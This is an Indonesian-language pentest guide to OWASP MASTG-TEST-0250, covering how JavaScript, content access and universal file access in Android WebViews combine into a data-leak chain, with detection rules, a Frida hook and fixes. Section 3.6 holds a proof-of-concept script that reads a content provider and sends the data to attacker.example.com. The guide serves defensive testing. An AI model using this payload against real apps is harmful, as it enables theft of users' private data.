# MASTG-TEST-0250 References to Content Provider Access in WebViews

| Atribut | Nilai |
|---|---|
| **Test ID** | MASTG-TEST-0250 |
| **Platform** | Android |
| **Kategori MASVS** | MASVS-PLATFORM (MASVS-PLATFORM-2: Aplikasi menggunakan WebView dengan aman) |
| **Weakness** | MASWE-0034 — *WebViews Allow Access to Local Resources with Untrusted Content* |
| **API yang disorot** | `WebView`, `WebSettings`, `getSettings`, `ContentProvider`, `setAllowContentAccess`, `setAllowUniversalAccessFromFileURLs`, `setJavaScriptEnabled` |
| **Tipe Pengujian** | Static, Code |
| **Profile** | L1, L2 |
| **Knowledge** | MASTG-KNOW-0018 (WebViews) |
| **Best Practice** | MASTG-BEST-0011 (Securely Load File Content in WebView), MASTG-BEST-0012 (Disable JavaScript in WebViews), MASTG-BEST-0013 (Disable Content Provider Access in WebViews), MASTG-BEST-0049 (Restrict and Validate Access to Exported Content Providers) |
| **Teknik terkait** | MASTG-TECH-0013, MASTG-TECH-0014, MASTG-TECH-0117, MASTG-TECH-0150 |
| **Demo terkait** | — (tidak ada) |
| **Rule resmi** | `mastg-android-webview-allow-local-access.yml` (ada — dengan catatan menarik: **nama file ≠ `id` internal rule**, lihat §3.2) — cakupannya deteksi saja, **tidak mengevaluasi kombinasi kondisi FAIL** |
| **CWE terkait** | CWE-200 (Exposure of Sensitive Information), CWE-668 (Exposure of Resource to Wrong Sphere) |

---

## 1. Penjelasan

### 1.1 Tujuan Pengujian

Kutipan overview resmi MASTG:

> *"This test checks for references to Content Provider access in WebViews, which is enabled by default and can be disabled using the `setAllowContentAccess` method in the `WebSettings` class. If improperly configured, this can introduce security risks such as unauthorized file access and data exfiltration."*

Test ini berbeda dari kebanyakan pengaturan WebView lain karena **`setAllowContentAccess` defaultnya selalu `true`, di semua versi Android**, tanpa pengecualian — poin yang secara eksplisit ditekankan resmi:

> **Note 1:** *"We do not consider `minSdkVersion` since `setAllowContentAccess` defaults to `true` regardless of the Android version."*

Ini kontras dengan pengaturan WebView lain seperti `setAllowFileAccess` yang defaultnya **berubah** tergantung API level (default `true` untuk API ≤29, berubah jadi `false` sejak API 30/Android 11 — dibahas di MASTG-KNOW-0018). Karena `setAllowContentAccess` tidak pernah "otomatis aman" pada versi Android manapun, **ketiadaan pemanggilan eksplisit method ini di kode sama sekali BUKAN indikasi aman** — justru sebaliknya, berarti WebView mewarisi nilai default `true` yang mengizinkan akses.

### 1.2 Apa yang Sebenarnya Diekspos: Bukan Hanya Content Provider Milik Aplikasi Sendiri

Overview resmi memberi rincian penting soal cakupan akses yang dibuka:

> *"The JavaScript code would have access to any content providers on the device, such as: declared by the app, **even if they are not exported**; declared by other apps, **only if they are exported**."*

Poin *"even if they are not exported"* adalah yang paling krusial untuk dipahami. Atribut `android:exported="false"` pada `<provider>` biasanya dianggap sebagai **jaminan kuat** bahwa provider tersebut tidak dapat diakses proses/aplikasi lain — namun jaminan ini **tidak berlaku** dalam konteks WebView milik aplikasi itu sendiri. Karena JavaScript yang berjalan di dalam WebView aplikasi beroperasi **dalam konteks proses aplikasi itu sendiri** (bukan sebagai aplikasi eksternal terpisah), ia dapat mengakses seluruh content provider yang dideklarasikan aplikasi tersebut, **terlepas dari status exported-nya**. Ini artinya kombinasi *"provider tidak di-export" + "WebView mengizinkan akses konten"* menciptakan celah yang **tidak akan pernah terdeteksi** hanya dengan memeriksa manifest sendirian (mis. lewat MASTG-BEST-0049 semata) — kedua aspek (konfigurasi provider **dan** konfigurasi WebView) harus diperiksa bersamaan.

### 1.3 Catatan yang Sering Disalahpahami: `android:grantUriPermissions` Tidak Relevan di Sini

Overview resmi secara eksplisit menepis kesalahpahaman umum:

> **Note 2:** *"The provider's `android:grantUriPermissions` attribute is irrelevant in this scenario as it does not affect the app itself accessing its own content providers. It allows other apps to temporarily access URIs from the provider."*

Ini penting karena penguji yang kurang teliti bisa salah menyimpulkan bahwa ketiadaan `grantUriPermissions` berarti aman — padahal atribut ini murni mengatur **akses sementara dari aplikasi lain**, sama sekali tidak memengaruhi kemampuan JavaScript di dalam WebView aplikasi itu sendiri untuk mengakses content provider milik aplikasi tersebut.

### 1.4 Tiga Kondisi yang Harus Terpenuhi Bersamaan untuk Kondisi FAIL Sesungguhnya

Ini bagian paling teknis dan krusial dari test ini — berbeda dari kebanyakan test WebView lain yang FAIL berdasarkan satu pengaturan tunggal, test ini menuntut **kombinasi tiga kondisi sekaligus**:

> *"The test case fails if all the following applies: `setJavaScriptEnabled` is explicitly set to `true`. `setAllowContentAccess` is explicitly set to `true` or not used at all. `setAllowUniversalAccessFromFileURLs` method is explicitly set to `true`."*

Mengapa ketiganya harus bersamaan? Karena inilah **rantai eksploitasi lengkap** yang menjadikan risiko ini nyata:

1. **`setJavaScriptEnabled(true)`** — tanpa JavaScript, tidak ada mekanisme untuk **membuat request terprogram** (`XMLHttpRequest`/`fetch`) ke URI `content://` sama sekali.
2. **`setAllowContentAccess`** (`true` atau default) — memastikan skema `content://` benar-benar dapat diakses/diselesaikan oleh WebView.
3. **`setAllowUniversalAccessFromFileURLs(true)`** — inilah kunci yang **melonggarkan same-origin policy** yang seharusnya mencegah halaman `file://` mengakses origin lain seperti `content://`.

Overview resmi menegaskan poin ketiga ini secara eksplisit sebagai yang **paling kritis** dalam rantai serangan:

> **Note 3:** *"`allowUniversalAccessFromFileURLs` is critical in the attack since it relaxes the default restrictions, allowing pages loaded from `file://` to access content from any origin, including `content://` URIs."*

Sesuai dokumentasi resmi Chromium yang dikutip MASTG-KNOW-0018: *"URLs starting with `file://` will have a scheme based origin, and can access other scheme based URLs over `XMLHttpRequest`. For instance, `file://foo` can make an `XMLHttpRequest` to `content://bar`, `http://example.com/`, and `https://www.google.com/`."* — inilah yang membuka jalur eksfiltrasi: halaman `file://` yang dimuat WebView (baik yang legitimate maupun yang berhasil disusupi lewat XSS/injection) dapat memakai JavaScript untuk membaca isi `content://` provider aplikasi dan mengirimkannya ke server penyerang lewat `fetch()`/XHR biasa ke domain HTTP eksternal.

**Bukti diagnostik bila salah satu kondisi tidak terpenuhi**: overview resmi memberi contoh konkret pesan error yang muncul di `logcat` bila `allowUniversalAccessFromFileURLs` **tidak** diaktifkan — CORS akan memblokir akses:

```text
[INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'
from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported
for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
```

Ini bukti diagnostik berharga: bila log ini muncul saat pengujian dinamis, itu **konfirmasi** bahwa proteksi CORS masih aktif (kondisi PASS untuk aspek ini), sedangkan bila request `content://` **berhasil** tanpa pesan tersebut, rantai eksploitasi lengkap sudah terpenuhi.

### 1.5 Bukan Kerentanan Berdiri Sendiri — Pengganda Dampak Serangan Lain

Overview resmi secara eksplisit mengklarifikasi sifat risiko ini:

> *"The `setAllowContentAccess` method being set to `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack."*

Ini konsisten dengan penjelasan MASTG-BEST-0012 (Disable JavaScript in WebViews) tentang JavaScript di WebView secara umum:

> *"JavaScript does increase the attack surface of a WebView, but severe cases typically happen when it is combined with one or more of the following conditions: loading untrusted or weakly validated content, exposing JavaScript bridges, allowing permissive file or content access, or using unsafe URL loading."*

Artinya, temuan pengaturan ini **sendirian** (tanpa disertai kerentanan lain seperti WebView yang memuat konten tidak tepercaya, activity WebView yang exported dan menerima URL sembarangan lewat Intent, atau XSS pada halaman yang dimuat) memiliki dampak yang jauh lebih terbatas. Namun **kombinasi** dengan kerentanan lain — terutama **exported Activity yang memuat WebView dan menerima URL dari Intent eksternal tanpa validasi** — mengubah risiko ini menjadi **rantai eksploitasi Local File Read (LFR) dan eksfiltrasi data** yang lengkap dan dapat dipicu aplikasi jahat lain di device yang sama tanpa memerlukan interaksi pengguna sama sekali.

### 1.6 Rekomendasi Resmi: Bukan Sekadar Menonaktifkan, Tapi Beralih Arsitektur

MASTG-BEST-0011 memberi rekomendasi yang lebih mendasar dibanding sekadar mematikan flag:

> *"The recommended approach to load file content to a WebView securely is to use `WebViewClient` with `WebViewAssetLoader` to load assets from the app's assets or resources directory using `https://` URLs instead of insecure `file://` URLs."*

Ini pergeseran arsitektural — alih-alih mengandalkan skema `file://` (yang secara inheren rawan terhadap kelas masalah ini) dan mengelola satu per satu flag WebSettings, `WebViewAssetLoader` memuat aset lewat skema `https://` virtual yang **sepenuhnya menghindari** masalah relaksasi same-origin policy berbasis `file://` ini sejak akarnya.

---

## 2. Tools yang Dipakai untuk Pengujian

### 2.1 Tools Wajib (Core)

| Tool | Fungsi |
|---|---|
| **jadx** | Dekompilasi DEX → Java untuk pencarian pola `WebSettings`/`setAllowContentAccess` |
| **grep / ripgrep** | Pencarian pola ketiga API sekaligus kombinasinya |
| **semgrep** | Menjalankan rule resmi sebagai baseline deteksi lokasi |
| **apktool/jadx (manifest)** | Ekstraksi daftar `<provider>` untuk MASTG-TECH-0150 |

### 2.2 Tools Alternatif & Pendukung

| Tool | Fungsi |
|---|---|
| **CodeQL** | Menelusuri apakah ketiga kondisi FAIL (§1.4) benar-benar terpenuhi **pada instance WebView yang sama**, bukan sekadar muncul di file yang sama tanpa keterkaitan |
| **MobSF** | Kadang menandai kombinasi pengaturan WebView berisiko di laporan Code Analysis |
| **Frida** | Hooking `WebSettings.setJavaScriptEnabled`/`setAllowContentAccess`/`setAllowUniversalAccessFromFileURLs` untuk konfirmasi nilai yang benar-benar diterapkan saat runtime (menangkap kasus nilai dibangun secara dinamis/kondisional) |
| **adb logcat** | Memantau pesan CORS block (§1.4) sebagai bukti diagnostik langsung saat pengujian dinamis |
| **Burp Suite/mitmproxy dengan proxy pada WebView** | Mengamati request `content://` yang berhasil dieksfiltrasi lewat `fetch()` ke server eksternal saat PoC eksploitasi dijalankan |

### 2.3 Prasyarat Lingkungan

- **Tidak butuh device/root** untuk analisis statis inti.
- **Device/emulator dibutuhkan** untuk konfirmasi dinamis (Frida/logcat) dan PoC eksploitasi.
- **Identifikasi seluruh content provider aplikasi terlebih dahulu** (MASTG-TECH-0150) sebagai peta data yang berpotensi terekspos — sesuai instruksi resmi untuk menilai "apakah mereka menangani data sensitif".

---

## 3. Cara Pengujian

### 3.1 Langkah Resmi MASTG

1. Gunakan **MASTG-TECH-0013** untuk reverse engineer aplikasi.
2. Gunakan **MASTG-TECH-0014** untuk mencari API yang relevan.
3. Gunakan **MASTG-TECH-0117** untuk memperoleh `AndroidManifest.xml`.
4. Gunakan **MASTG-TECH-0150** untuk memperoleh daftar content provider yang dideklarasikan di manifest.

### 3.2 Metode A — Rule Semgrep Resmi *(ada, tapi hanya deteksi lokasi — tidak evaluasi kombinasi)*

```yaml
rules:
  - id: mastg-android-webview-settings
    severity: INFO
    languages:
      - java
    metadata:
      summary: This rule detects WebView settings related to local file access and JavaScript execution.
    message: "[MASVS-PLATFORM-2] Detected WebView settings."
    pattern-either:
      - pattern: $WEBVIEW.getSettings(...);
      - pattern: $SETTINGS.setJavaScriptEnabled($ARG);
      - pattern: $SETTINGS.setAllowContentAccess($ARG);
      - pattern: $SETTINGS.setAllowFileAccessFromFileURLs($ARG);
      - pattern: $SETTINGS.setAllowFileAccess($ARG);
      - pattern: $SETTINGS.setAllowUniversalAccessFromFileURLs($ARG);
```

```bash
jadx -d ./decompiled ./target-app.apk
semgrep --config https://raw.githubusercontent.com/OWASP/mastg/master/rules/mastg-android-webview-allow-local-access.yml ./decompiled/sources/
```

**Catatan tentang rule ini:**

1. **Nama file berbeda dari `id` internal** — file bernama `mastg-android-webview-allow-local-access.yml` tapi `id` di dalamnya adalah `mastg-android-webview-settings`. Ketidaksesuaian penamaan ini murni kosmetik, tapi berpotensi membingungkan saat mencocokkan hasil scan dengan dokumentasi rule di masa depan.
2. **Rule ini murni mendeteksi lokasi kemunculan keenam pola API** (termasuk sekadar `getSettings()`) — ia **tidak mengevaluasi apakah ketiga kondisi FAIL (§1.4) benar-benar terpenuhi bersamaan** dengan nilai argumen yang sesuai. Severity `INFO` mencerminkan sifatnya sebagai alat inventarisasi, bukan penilai risiko final.
3. **Tidak memvalidasi nilai argumen** — rule cocok untuk `setJavaScriptEnabled(false)` sama seperti `setJavaScriptEnabled(true)`, sehingga hasil scan **tidak bisa langsung dibaca sebagai temuan FAIL** tanpa pemeriksaan manual nilai argumen setiap kemunculan.

### 3.3 Metode B — Semgrep Kustom yang Mengevaluasi Kombinasi Kondisi FAIL Sesungguhnya

```yaml
rules:
  - id: custom-webview-content-provider-exfil-chain
    languages: [java, kotlin]
    severity: ERROR
    message: "[MASVS-PLATFORM-2] Kombinasi lengkap ditemukan: JavaScript aktif + content access diizinkan + universal file access aktif — rantai eksfiltrasi content provider via WebView"
    patterns:
      - pattern-inside: |
          $SETTINGS.setJavaScriptEnabled(true);
          ...
      - pattern-inside: |
          $SETTINGS.setAllowUniversalAccessFromFileURLs(true);
          ...
      - pattern-not: $SETTINGS.setAllowContentAccess(false);
```

```bash
semgrep -c ./webview-content-exfil-rule.yml ./decompiled/sources/
```

### 3.4 Metode C — grep/ripgrep Manual dengan Verifikasi Nilai Argumen

```bash
D=./decompiled/sources

# Ekstrak konteks lengkap sekitar setiap instance WebSettings untuk verifikasi manual nilai argumen
rg -n -B2 -A10 'getSettings\(\)' $D | grep -A10 "setJavaScriptEnabled\|setAllowContentAccess\|setAllowUniversalAccessFromFileURLs"

# Cari spesifik ketiadaan setAllowContentAccess (default true, F1 §1.1)
rg -l 'setJavaScriptEnabled(true)' $D | xargs -I{} sh -c 'echo "=== {} ==="; grep -c "setAllowContentAccess" {}'
```

### 3.5 Metode D — CodeQL (Korelasi pada Instance WebView yang Sama)

```ql
import java

class WebSettingsCall extends MethodAccess {
  WebSettingsCall() {
    this.getMethod().getDeclaringType().hasQualifiedName("android.webkit", "WebSettings")
  }
}

from MethodAccess jsCall, MethodAccess universalCall, Expr contentAccessArg
where
  jsCall.getMethod().hasName("setJavaScriptEnabled") and
  jsCall.getArgument(0).(BooleanLiteral).getBooleanValue() = true and
  universalCall.getMethod().hasName("setAllowUniversalAccessFromFileURLs") and
  universalCall.getArgument(0).(BooleanLiteral).getBooleanValue() = true and
  jsCall.getQualifier().toString() = universalCall.getQualifier().toString()
select jsCall, universalCall, "Kombinasi JavaScript + Universal Access ditemukan pada objek WebSettings yang sama"
```

### 3.6 Metode E — Verifikasi Dinamis (Konfirmasi Eksploitasi Nyata)

```html
<!-- poc.html — dimuat via file:// pada WebView target, mensimulasikan halaman yang disusupi -->
<script>
fetch("content://com.target.app.provider/sensitive_data")
    .then(response => response.text())
    .then(data => {
        // Eksfiltrasi ke server penyerang
        fetch("https://attacker.example.com/collect?data=" + encodeURIComponent(data));
    })
    .catch(err => console.error("Gagal mengakses content provider: " + err));
</script>
```

```bash
adb logcat | grep -i "CORS\|content://\|CONSOLE"
```

Bila request `fetch()` ke `content://` **berhasil** (tidak muncul pesan CORS block seperti dikutip §1.4) dan data benar-benar terkirim ke server eksternal, ini konfirmasi definitif rantai eksploitasi lengkap berfungsi.

### 3.7 Metode F — Frida (Konfirmasi Nilai Runtime, Termasuk yang Dibangun Dinamis)

```javascript
// hook-webview-settings.js
Java.perform(function () {
    var WebSettings = Java.use("android.webkit.WebSettings");
    ["setJavaScriptEnabled", "setAllowContentAccess", "setAllowUniversalAccessFromFileURLs"].forEach(function (method) {
        WebSettings[method].overload("boolean").implementation = function (value) {
            console.log("[*] WebSettings." + method + "(" + value + ")");
            return this[method](value);
        };
    });
});
```

```bash
frida -U -f com.target.app -l hook-webview-settings.js --no-pause
```

### 3.8 Perbandingan Metode: Kapan Memakai yang Mana

| Metode | Tool | Mendeteksi lokasi? | Mengevaluasi kombinasi FAIL? | Kapan dipakai |
|---|---|---|---|---|
| **A** | Rule semgrep resmi | ✅ | ❌ | Baseline inventarisasi lokasi |
| **B** | Semgrep kustom | ✅ | ✅ (pola sederhana) | Gate CI/CD untuk kombinasi berisiko |
| **C** | grep manual | ✅ | Manual (perlu verifikasi mata) | Verifikasi detail per lokasi |
| **D** | CodeQL | ✅ | ✅ (korelasi presisi pada instance yang sama) | Codebase besar dengan banyak instance WebView |
| **E** | PoC dinamis | N/A | ✅ (bukti definitif) | Konfirmasi akhir eksploitasi nyata |
| **F** | Frida | ✅ (runtime) | Sebagian | Nilai yang dibangun dinamis/kondisional |

**Kombinasi minimum yang aku rekomendasikan:** **A/C (baseline+manual) → D (korelasi presisi via CodeQL) → E (PoC dinamis)** untuk kesimpulan yang solid, ditambah verifikasi silang daftar content provider (MASTG-TECH-0150) untuk menilai sensitivitas data yang berpotensi terekspos.

---

### 3.9 Kriteria Evaluasi: Positive Case & Negative Case

**Aturan resmi MASTG:**

> **Evaluation:** *"The test case fails if all the following applies: `setJavaScriptEnabled` is explicitly set to `true`. `setAllowContentAccess` is explicitly set to `true` or not used at all. `setAllowUniversalAccessFromFileURLs` method is explicitly set to `true`. You should use the list of content providers obtained in the observation step to verify if they handle sensitive data."*

---

#### ❌ FAIL / ISSUE — Check dinyatakan GAGAL apabila:

| No | Kondisi |
|---|---|
| F1 | Ketiga kondisi resmi (§1.4) terpenuhi bersamaan pada **instance WebView yang sama**: `setJavaScriptEnabled(true)` + (`setAllowContentAccess(true)` atau tidak dipanggil sama sekali) + `setAllowUniversalAccessFromFileURLs(true)` |
| F2 | Content provider yang teridentifikasi (MASTG-TECH-0150) terbukti menangani **data sensitif** (kredensial, PII, token) — meningkatkan dampak nyata dari kombinasi F1 |
| F3 | Verifikasi dinamis (Metode E) mengonfirmasi `fetch()`/XHR ke `content://` **berhasil** tanpa diblokir CORS |
| F4 | Kombinasi F1 ditemukan pada WebView yang dimuat dari **Activity yang exported** dan menerima URL dari Intent eksternal tanpa validasi memadai — kombinasi berdampak paling parah (§1.5) |

**Contoh bukti (ilustratif — MASTG belum menyediakan demo resmi untuk test ini):**

```java
// Ditemukan di com/example/target/ui/DocumentViewerActivity.java
WebView webView = findViewById(R.id.webview);
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);                        // baris 24
settings.setAllowUniversalAccessFromFileURLs(true);          // baris 25
// setAllowContentAccess TIDAK dipanggil sama sekali -> default TRUE
webView.loadUrl("file:///android_asset/viewer.html");
```

```bash
$ rg -n 'setJavaScriptEnabled\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|setAllowContentAccess' \
  ./decompiled/sources/com/example/target/ui/DocumentViewerActivity.java
24:settings.setJavaScriptEnabled(true);
25:settings.setAllowUniversalAccessFromFileURLs(true);
# setAllowContentAccess tidak ditemukan -> default true (kondisi F1 terpenuhi)
```

Interpretasi: ketiga kondisi resmi terpenuhi — **FAIL**. Langkah berikutnya: periksa daftar content provider aplikasi (MASTG-TECH-0150) untuk menilai data apa yang berpotensi terekspos lewat rantai ini.

---

#### ✅ PASS — Check dinyatakan LULUS apabila:

| No | Kondisi |
|---|---|
| P1 | `setJavaScriptEnabled` diset `false` atau tidak dipakai (default aman) pada WebView yang memuat konten `file://` |
| P2 | `setAllowContentAccess(false)` diset eksplisit sesuai rekomendasi MASTG-BEST-0013 |
| P3 | `setAllowUniversalAccessFromFileURLs` diset `false` atau tidak dipanggil (default aman sejak API 16+) |
| P4 | Aplikasi memakai `WebViewAssetLoader` dengan skema `https://` virtual sesuai MASTG-BEST-0011, sepenuhnya menghindari `file://` |
| P5 | Verifikasi dinamis (Metode E) mengonfirmasi request `content://` diblokir CORS |

---

#### ⚠️ Catatan Penting tentang Penilaian

1. **Jangan simpulkan FAIL dari satu pengaturan saja** — sesuai §1.4, ketiga kondisi harus terpenuhi **bersamaan** pada instance WebView yang sama. Rule semgrep resmi (Metode A) hanya melakukan inventarisasi lokasi, bukan evaluasi kombinasi — verifikasi manual atau Metode B/D wajib dilakukan sebelum melaporkan FAIL.

2. **Ketiadaan `setAllowContentAccess` bukan tanda aman** — berbeda dari kebanyakan pengaturan WebView lain, default-nya selalu `true` di semua versi Android (§1.1). Absennya pemanggilan eksplisit method ini di kode harus dibaca sebagai **kondisi terpenuhi**, bukan diabaikan.

3. **Jangan terkecoh oleh status `exported` provider maupun `grantUriPermissions`** — sesuai §1.2 dan §1.3, keduanya tidak relevan untuk mencegah akses dari WebView milik aplikasi itu sendiri.

4. **Selalu korelasikan dengan daftar content provider dan sensitivitas datanya** — klausul resmi eksplisit meminta ini ("verify if they handle sensitive data"). Kombinasi tiga kondisi FAIL yang hanya mengekspos provider berisi data non-sensitif (mis. cache gambar publik) memiliki dampak jauh lebih rendah dibanding yang mengekspos kredensial/token.

5. **Nilai temuan meningkat drastis bila dikombinasikan dengan exported Activity + URL loading tanpa validasi** — sesuai §1.5, ini bukan kerentanan berdiri sendiri; korelasikan dengan pengujian Activity yang exported dan validasi URL WebView (MASTG-KNOW-0018 bagian WebViewClient).

6. **Manfaatkan bukti diagnostik logcat (§1.4)** sebagai cara cepat mengonfirmasi status proteksi CORS secara empiris, tanpa perlu membangun PoC eksploitasi lengkap.

7. **Severity dimodulasi:**

   | Faktor | Severity |
   |---|---|
   | Kombinasi 3 kondisi FAIL + content provider berisi data sensitif + Activity exported tanpa validasi URL | **Kritis** |
   | Kombinasi 3 kondisi FAIL + content provider berisi data sensitif, tanpa exported Activity berisiko | **Tinggi** |
   | Kombinasi 3 kondisi FAIL, tapi content provider hanya berisi data non-sensitif | **Rendah/Menengah** |
   | Hanya sebagian kondisi terpenuhi (mis. JS aktif tapi universal access tidak) | **Informational** — catat sebagai potensi risiko bila konfigurasi berubah di masa depan |

8. **Dokumentasikan:** nilai ketiga pengaturan pada setiap instance WebView, daftar lengkap content provider beserta klasifikasi sensitivitas datanya, status Activity yang memuat WebView (exported/tidak, validasi URL), dan hasil verifikasi dinamis.

---

## 4. Rekomendasi Perbaikan

### 4.1 Nonaktifkan Content Access Bila Tidak Diperlukan

```kotlin
webView.settings.apply {
    allowContentAccess = false   // sesuai MASTG-BEST-0013, wajib eksplisit karena default selalu true
}
```

### 4.2 Nonaktifkan Universal Access dari File URLs

```kotlin
webView.settings.apply {
    allowUniversalAccessFromFileURLs = false  // memutus rantai eksploitasi kunci (§1.4)
}
```

### 4.3 Migrasi ke WebViewAssetLoader (Solusi Arsitektural, Sesuai MASTG-BEST-0011)

```kotlin
val assetLoader = WebViewAssetLoader.Builder()
    .addPathHandler("/assets/", WebViewAssetLoader.AssetsPathHandler(context))
    .build()

webView.webViewClient = object : WebViewClientCompat() {
    override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? {
        return assetLoader.shouldInterceptRequest(request.url)
    }
}
webView.loadUrl("https://appassets.androidplatform.net/assets/viewer.html")
```

### 4.4 Perkuat Konfigurasi Content Provider Secara Independen

Sesuai MASTG-BEST-0049, meski tidak menggantikan mitigasi WebView, pastikan seluruh content provider yang tidak butuh diakses eksternal diset `android:exported="false"` secara eksplisit sebagai lapisan pertahanan tambahan.

### 4.5 Integrasikan ke CI/CD

```bash
#!/bin/bash
# ci-check-webview-content-exfil.sh
APK=$1
jadx -d /tmp/decompiled_check "$APK" 2>/dev/null
semgrep -c ./webview-content-exfil-rule.yml /tmp/decompiled_check/sources/ --json | jq '.results | length'
```

### 4.6 Checklist Remediasi

- [ ] Seluruh instance WebView sudah diinventarisasi dan diperiksa ketiga pengaturan sekaligus (bukan satu per satu terpisah)
- [ ] `setAllowContentAccess(false)` diset eksplisit di seluruh WebView yang tidak butuh akses content provider
- [ ] `setAllowUniversalAccessFromFileURLs(false)` diset eksplisit atau dibiarkan default aman
- [ ] Migrasi ke `WebViewAssetLoader` dipertimbangkan untuk WebView yang memuat konten lokal
- [ ] Content provider aplikasi sudah diaudit status exported dan sensitivitas datanya
- [ ] Activity yang memuat WebView sudah diperiksa status exported dan validasi URL-nya
- [ ] Verifikasi dinamis (PoC/logcat) sudah dilakukan untuk konfirmasi
- [ ] **Verifikasi ulang:** jalankan kembali MASTG-TEST-0250 pada APK release final setelah remediasi

---

## 5. Referensi

### 5.1 OWASP MASTG / MASVS

- [MASTG-TEST-0250: References to Content Provider Access in WebViews](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/)
- [MASWE-0034: WebViews Allow Access to Local Resources with Untrusted Content](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/)
- [MASTG-KNOW-0018: WebViews](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/)
- [MASTG-BEST-0011: Securely Load File Content in a WebView](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0011/)
- [MASTG-BEST-0012: Disable JavaScript in WebViews](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/)
- [MASTG-BEST-0013: Disable Content Provider Access in WebViews](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0013/)
- [MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/)
- [Rule resmi: mastg-android-webview-allow-local-access.yml (GitHub)](https://github.com/OWASP/mastg/blob/master/rules/mastg-android-webview-allow-local-access.yml)

### 5.2 Dokumentasi Resmi Android

- [Android Developers — `WebSettings#setAllowContentAccess`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowContentAccess(boolean))
- [Android Developers — `WebSettings#setAllowUniversalAccessFromFileURLs`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean))
- [Android Developers — WebViews: Unsafe File Inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion)
- [Android Developers — Cross-App Scripting risks](https://developer.android.com/privacy-and-security/risks/cross-app-scripting)
- [Android Developers — `WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader)
- [Chromium WebView Docs — CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md)

### 5.3 Riset dan Kasus Nyata

- [Medium — Exploiting Insecure Android WebView with setAllowUniversalAccessFromFileURLs](https://medium.com/@youssefhussein212103168/exploiting-insecure-android-webview-with-setallowuniversalaccessfromfileurls-c7f4f7a8db9c)
- [INTEGRITY Labs — Reviewing Android WebViews fileAccess Attack Vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [Google — Fixing a File-based XSS Vulnerability](https://support.google.com/faqs/answer/7668153?hl=en-GB)
- [Alesandro Ortiz — Universal XSS in Android WebView (CVE-2020-6506)](https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/)
- [HackTricks — WebView Attacks](https://hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/webview-attacks.html)
- [Redfox Security — Exploiting Android WebView Vulnerabilities](https://redfoxsec.com/blog/exploiting-android-webview-vulnerabilities/)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-668: Exposure of Resource to Wrong Sphere](https://cwe.mitre.org/data/definitions/668.html)

### 5.4 Dokumentasi Tools

- [Semgrep — Documentation](https://semgrep.dev/docs/)
- [CodeQL — Documentation](https://codeql.github.com/docs/)
- [jadx — Dex to Java decompiler](https://github.com/skylot/jadx)
- [Frida — Dynamic instrumentation toolkit](https://frida.re/docs/javascript-api/)
- [MobSF — Mobile Security Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

---

*Dokumen ini disusun berdasarkan OWASP MASTG (rilis terkini per September 2026), dokumentasi resmi Android/Chromium, serta riset komunitas keamanan mengenai eksploitasi WebView. Nuansa terpenting test ini: kondisi FAIL menuntut **kombinasi tiga pengaturan sekaligus** pada instance WebView yang sama — rule semgrep resmi hanya menginventarisasi lokasi tanpa mengevaluasi kombinasi tersebut, sehingga verifikasi manual atau tooling tambahan (semgrep kustom/CodeQL) wajib dilakukan sebelum menyimpulkan hasil.*
